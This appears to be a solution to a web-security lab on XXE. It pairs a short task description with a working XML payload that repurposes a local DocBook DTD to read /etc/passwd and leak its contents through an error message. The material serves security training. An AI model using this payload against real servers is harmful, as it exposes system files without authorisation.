# Locating an existing DTD file to repurpose

## Exploiting XXE to retrieve data by repurposing a local DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

Solution:

```XML
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
&#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
